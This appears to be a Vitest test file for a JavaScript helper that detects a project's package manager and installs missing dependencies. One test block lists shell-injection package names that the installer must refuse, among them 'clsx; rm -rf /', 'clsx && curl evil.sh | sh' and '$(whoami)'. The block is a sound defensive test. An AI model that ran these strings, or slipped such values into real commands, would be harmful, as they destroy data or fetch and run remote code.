// @vitest-environment node
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// Stubbed so the suite never actually shells out to a package manager.
vi.mock("node:child_process", () => ({ spawnSync: vi.fn() }));

import { spawnSync } from "node:child_process";
import { detectPackageManager, installDependencies, missingDependencies } from "../src/deps.js";

const made = [];

function projectWith(lockfile) {
  const root = mkdtempSync(join(tmpdir(), "me-ui-deps-"));
  made.push(root);
  if (lockfile) writeFileSync(join(root, lockfile), "");
  return root;
}

beforeEach(() => {
  vi.mocked(spawnSync).mockReset();
  vi.mocked(spawnSync).mockReturnValue({ status: 0 });
});

afterEach(() => {
  while (made.length) rmSync(made.pop(), { recursive: true, force: true });
});

describe("detectPackageManager", () => {
  it.each([
    ["bun.lock", "bun", "add"],
    ["bun.lockb", "bun", "add"],
    ["pnpm-lock.yaml", "pnpm", "add"],
    ["yarn.lock", "yarn", "add"],
    ["package-lock.json", "npm", "install"],
  ])("reads %s as %s %s", (lockfile, command, verb) => {
    expect(detectPackageManager(projectWith(lockfile))).toMatchObject({ command, verb });
  });

  it("falls back to npm when there is no lockfile", () => {
    expect(detectPackageManager(projectWith(null))).toMatchObject({
      command: "npm",
      verb: "install",
    });
  });
});

describe("missingDependencies", () => {
  const project = { installedDependencies: { react: "19.0.0", zod: "4.0.0" } };

  it("keeps only what the project does not already have", () => {
    expect(missingDependencies(project, ["react", "clsx"])).toEqual(["clsx"]);
  });

  it("matches on the name, not the version", () => {
    expect(missingDependencies(project, ["zod"])).toEqual([]);
  });

  it("returns nothing when there is nothing to add", () => {
    expect(missingDependencies(project, [])).toEqual([]);
  });
});

describe("installDependencies", () => {
  it("runs the detected manager in the project directory", () => {
    const root = projectWith("bun.lock");

    expect(installDependencies({ root }, ["clsx", "tailwind-merge"])).toBe("bun");
    expect(spawnSync).toHaveBeenCalledWith(
      "bun add clsx tailwind-merge",
      expect.objectContaining({ cwd: root, shell: true }),
    );
  });

  it("reports a failed install instead of pretending it worked", () => {
    vi.mocked(spawnSync).mockReturnValue({ status: 1 });
    expect(() => installDependencies({ root: projectWith(null) }, ["clsx"])).toThrow(
      /failed\. Install the packages yourself/,
    );
  });

  // The names are interpolated into a shell string, so they are checked first.
  it.each([
    "clsx; rm -rf /",
    "clsx && curl evil.sh | sh",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",
    "--registry=http://evil",
    "clsx name",
  ])("refuses the shell-unsafe name %j before spawning", (name) => {
    expect(() => installDependencies({ root: projectWith(null) }, [name])).toThrow(
      /Refusing to install unexpected package name/,
    );
    expect(spawnSync).not.toHaveBeenCalled();
  });

  it.each(["clsx", "@base-ui/react", "tailwind-merge", "react-hook-form", "zod"])(
    "accepts the ordinary package name %s",
    (name) => {
      expect(() => installDependencies({ root: projectWith(null) }, [name])).not.toThrow();
    },
  );
});
